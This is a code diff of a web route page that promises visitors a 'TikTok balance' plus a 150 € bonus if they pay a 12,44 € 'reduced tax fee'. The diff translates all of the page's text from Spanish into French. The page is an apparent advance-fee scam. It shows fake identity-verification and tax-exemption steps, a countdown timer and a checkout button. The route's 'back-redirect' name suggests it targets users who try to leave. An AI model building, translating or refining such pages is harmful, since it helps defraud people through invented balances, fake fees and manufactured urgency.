@@ -7,16 +7,16 @@ import { CooudCheckout } from "@/components/CooudCheckout";
 export const Route = createFileRoute("/back-redirect")({
   head: () => ({
     meta: [
-      { title: "Descuento de impuestos aplicado | Libera tu saldo TikTok" },
+      { title: "Réduction de taxes appliquée | Débloquez votre solde TikTok" },
       {
         name: "description",
         content:
-          "Hemos identificado un descuento de impuestos y tasas: paga solo 12,44 € y recibe además 150,00 € de bono extra al liberar tu saldo.",
+          "Nous avons identifié une réduction de taxes et de frais : payez seulement 12,44 € et recevez 150,00 € de bonus au déblocage de votre solde.",
       },
-      { property: "og:title", content: "Descuento de impuestos aplicado" },
+      { property: "og:title", content: "Réduction de taxes appliquée" },
       {
         property: "og:description",
-        content: "Tasa reducida a 12,44 € + 150,00 € de bono extra. Oferta por tiempo limitado.",
+        content: "Frais réduits à 12,44 € + 150,00 € de bonus. Offre à durée limitée.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -26,10 +26,10 @@ export const Route = createFileRoute("/back-redirect")({
 });
 
 const STEPS = [
-  "Verificando DNI/NIE",
-  "Localizando exenciones de impuestos",
-  "Aplicando descuento de tasas estatales",
-  "Calculando bono de compensación",
+  "Vérification de votre identité",
+  "Recherche des exonérations fiscales",
+  "Application de la réduction des taxes",
+  "Calcul du bonus de compensation",
 ];
 
 function BackRedirect() {
@@ -88,35 +88,35 @@ function BackRedirect() {
 
         <div className="mb-6 w-full animate-pulse rounded-3xl border-2 border-emerald-500 bg-emerald-50 p-6">
           <p className="mb-2 text-[11px] font-black uppercase tracking-widest text-emerald-600">
-            ✅ Oportunidad única en el DNI
+            ✅ Offre unique liée à votre dossier
           </p>
           <h1 className="text-2xl font-black leading-tight text-neutral-900">
-            HEMOS IDENTIFICADO UN DESCUENTO DE
+            NOUS AVONS IDENTIFIÉ UNE RÉDUCTION DE
             <br />
-            <span className="uppercase text-emerald-600">¡IMPUESTOS Y TASAS!</span>
+            <span className="uppercase text-emerald-600">TAXES ET DE FRAIS !</span>
           </h1>
         </div>
 
         <div className="mb-8 w-full rounded-[2.5rem] border border-neutral-100 bg-white p-8 shadow-2xl">
           <p className="mb-4 text-[10px] font-bold uppercase tracking-widest text-neutral-400">
-            Esta oferta expira en:
+            Cette offre expire dans :
           </p>
           <div className="mb-6 text-6xl font-black text-rose-500 tabular-nums">
             {mm}:{ss}
           </div>
 
           <div className="mb-6 space-y-3">
-            <p className="text-lg font-bold text-neutral-700">Tasa reducida a solo:</p>
+            <p className="text-lg font-bold text-neutral-700">Frais réduits à seulement :</p>
             <div className="text-4xl font-black italic text-neutral-900">12,44 €</div>
             <div className="mx-auto my-4 h-[2px] w-12 bg-neutral-200" />
             <p className="bg-gradient-to-r from-rose-500 to-sky-500 bg-clip-text text-2xl font-black uppercase italic tracking-tighter text-transparent">
-              + 150,00 € de bono extra
+              + 150,00 € de bonus
             </p>
           </div>
 
           <p className="border-t border-neutral-100 pt-4 text-[11px] italic leading-tight text-neutral-400">
-            *Se ha aplicado el descuento de impuestos y tasas. Al pagar los 12,44 €, el sistema
-            libera tu saldo acumulado + el bono de 150,00 € inmediatamente.
+            *La réduction de taxes et de frais a été appliquée. Dès le paiement des 12,44 €, le système
+            débloque immédiatement votre solde accumulé ainsi que le bonus de 150,00 €.
           </p>
         </div>
 
@@ -134,7 +134,7 @@ function BackRedirect() {
             onClick={() => setShowCheckout(true)}
             className="w-full rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-6 text-xl font-black uppercase tracking-tighter text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
           >
-            Canjear mi descuento + bono
+            Profiter de ma réduction + bonus
           </button>
         )}
       </section>
